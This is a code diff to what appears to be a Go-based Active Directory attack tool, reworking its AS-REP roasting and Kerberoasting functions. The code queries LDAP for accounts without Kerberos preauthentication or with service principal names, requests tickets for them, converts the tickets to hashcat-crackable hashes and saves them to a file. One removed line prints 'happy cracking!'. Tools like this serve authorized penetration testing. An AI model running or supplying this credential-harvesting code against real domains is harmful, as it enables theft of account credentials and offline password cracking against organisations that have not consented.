@@ -177,31 +177,10 @@ func (o *LdapOptions) authenticate(ldapClient *ldap.LdapClient) (credential, err
 }
 
 func (o *LdapOptions) asreproast(target string) error {
-	var res []string
-	for _, creds := range o.credentials {
-		client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
-		if err != nil {
-			return err
-		}
-		asrep, err := client.GetAsReqTgt(creds.Username)
-		if err == nil {
-			hash := kerberos.ASREPToHashcat(*asrep.Ticket)
-			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.Connection.Domain, creds.Username, hash)
-			res = append(res, hash)
-		}
-	}
-
-	if len(res) == 0 {
-		return fmt.Errorf("[%s] no asrep-roastable user found on target", target)
-	}
-	return writeLines(res, o.Hashes.AsrepRoast)
-}
-
-func (o *LdapOptions) kerberoast(target string) error {
 	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
 	ldapFilter := ldap.JoinFilters(
 		ldap.FilterIsUser,
-		ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+		ldap.UACFilter(ldap.DONT_REQ_PREAUTH),
 	)
 	defer lclient.Close()
 
@@ -216,9 +195,7 @@ func (o *LdapOptions) kerberoast(target string) error {
 	}
 	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
-	tbl := table.New("Module", "Target", "Domain", ldap.SAMAccountName, ldap.ServicePrincipalName, "Hash")
-	tbl.WithHeaderFormatter(color.New(color.FgGreen, color.Underline).SprintfFunc()).WithFirstColumnFormatter(color.New(color.FgYellow).SprintfFunc())
-
+	tbl := initializeTable("Module", "Target", "Domain", ldap.SAMAccountName, ldap.ServicePrincipalName, "Hash")
 	var hashes []string
 	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
 		if len(obj.ServicePrincipalName) == 0 {
@@ -244,7 +221,56 @@ func (o *LdapOptions) kerberoast(target string) error {
 		return err
 	}
 
-	fmt.Println()
+	tbl.Print()
+	fmt.Printf("\nSaving hashes to '%s'\n\n", o.Hashes.AsrepRoast)
+	return writeLines(hashes, o.Hashes.AsrepRoast)
+}
+
+func (o *LdapOptions) kerberoast(target string) error {
+	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
+	ldapFilter := ldap.JoinFilters(
+		ldap.FilterIsUser,
+		ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+	)
+	defer lclient.Close()
+
+	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
+	if err != nil {
+		return err
+	}
+
+	creds, err := o.authenticate(lclient)
+	if err != nil {
+		return err
+	}
+	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
+
+	tbl := initializeTable("Module", "Target", "Domain", ldap.SAMAccountName, ldap.ServicePrincipalName, "Hash")
+	var hashes []string
+	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
+		if len(obj.ServicePrincipalName) == 0 {
+			return nil
+		}
+
+		for i, spn := range obj.ServicePrincipalName {
+			tgs, err := krb5client.GetServiceTicket(obj.SAMAccountName, spn)
+			if err != nil {
+				return err
+			}
+
+			hash := kerberos.TGSToHashcat(tgs.Ticket, obj.SAMAccountName)
+			tbl.AddRow("LDAP", target, o.Connection.Domain, obj.SAMAccountName, spn, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
+
+			if i == 0 {
+				hashes = append(hashes, hash)
+			}
+		}
+		return nil
+	})
+	if err != nil {
+		return err
+	}
+
 	tbl.Print()
 	fmt.Printf("\nSaving hashes to '%s'\n\n", o.Hashes.Kerberoast)
 	return writeLines(hashes, o.Hashes.Kerberoast)
